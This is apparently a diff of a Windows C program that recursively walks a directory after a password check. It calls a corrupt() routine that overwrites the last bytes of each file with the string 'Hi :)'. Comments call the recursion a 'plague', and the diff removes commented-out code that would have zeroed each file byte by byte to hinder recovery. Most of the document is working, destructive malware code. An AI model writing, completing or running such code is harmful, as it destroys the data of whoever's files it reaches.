@@ -48,21 +48,8 @@ int corrupt(wchar_t *sTarget)
 #endif
 		return 1;
 	}
-
-	/*
-	char buffer[1024 * 64] = {0};
-	fwrite(buffer, 1, sizeof(buffer), fp);
-	*/
 	fseek ( fp , iFileSize-5, SEEK_SET ); // 5 bytes for the friendly salutation :>
 	fputs("Hi :)",fp);
-
-	/*// this method will prevent the OS from creating sparse files, and will be harder to recover overwritten data. 
-	for (u_long i=0 ; i < iFileSize ; i++)
-	{
-	fseek ( fp , i, SEEK_SET );
-	fputs("\x00",fp);
-	}
-	*/
 	fclose(fp);
 	return 0;
 }
@@ -79,6 +66,7 @@ int ListDirectoryContents(const wchar_t *sDir)
 	hFind = FindFirstFile(sPath, &FindFileData);
 	if(INVALID_HANDLE_VALUE == hFind )
 	{ 
+
 		wprintf_s(L"Path not found: [%s]\n", sDir); 
 		return 1; 
 	} 
@@ -88,12 +76,10 @@ int ListDirectoryContents(const wchar_t *sDir)
 		if(wcscmp(FindFileData.cFileName, L".") != 0 && wcscmp(FindFileData.cFileName, L"..") != 0) // remove `.` & `..`
 		{ 
 			wsprintf(sPath, L"%s\\%s", sDir, FindFileData.cFileName); 
-			//StringCbPrintf(sPath,MAX_PATH, L"%s\\%s", sDir, FindFileData.cFileName);
-			//Is the entity a File or Folder? 
-			if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
+			if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 	//Is the entity a Folder? 
 			{ 
 				wprintf_s(L"Directory: %s\n", sPath); 
-				ListDirectoryContents(sPath); //Recursion, we love it! 
+				ListDirectoryContents(sPath); //Recursion, keep the plague going... 
 			} 
 			else{ 
 				wprintf_s(L"File: %s\n", sPath); 
@@ -113,7 +99,9 @@ int _tmain(int argc, TCHAR *argv[])
 	char cUserInput[32]={0};
 	wprintf_s(L"Password:\n");
 	fgets(cUserInput, sizeof(cUserInput), stdin);
+#ifdef _DEBUG
 	printf_s("Password is: %s\n", cUserInput);
+#endif
 	cUserInput[strlen(cUserInput)-1] = '\0'; //replace \n with \0
 	BYTE byteHashbuffer[16] = {0}; //where the computed hash will be stored
 	GetMD5Hash(cUserInput, byteHashbuffer);
@@ -122,15 +110,11 @@ int _tmain(int argc, TCHAR *argv[])
 	{
 		wprintf_s(L"%02x",byteHashbuffer[i]); //the %02x means output 2 digit hex, with leading zeros.
 	}
+	wprintf_s(L"\n");
 #endif
-
-	
-	int i = memcmp(byteHashbuffer,cMD5PassHash,16);
-	
-	/*
-	int i = wcscmp(cUserInput,L"test123\n");
-	*/
-	if(i!=0)
+		
+	int i = memcmp(byteHashbuffer,cMD5PassHash,16); //MD5 hash is 16 bytes, we need to compare 16 bytes. 
+	if(i!=0) //anything other than 0 is they don't match.
 	{
 	wprintf_s(L"Bad password!\n");
 	exit(1);
@@ -149,7 +133,9 @@ int _tmain(int argc, TCHAR *argv[])
 	{
 		wcscpy_s(cDstDir, MAX_PATH, argv[1]);
 	}
-	wprintf_s(L"cDstDir is:\t%s\n", cDstDir);
+
+	wprintf_s(L"cDstDir is:\t%s\nTo proceed press [Enter]... ", cDstDir);
+	getchar();
 	ListDirectoryContents(cDstDir);
 	return 0;
 }
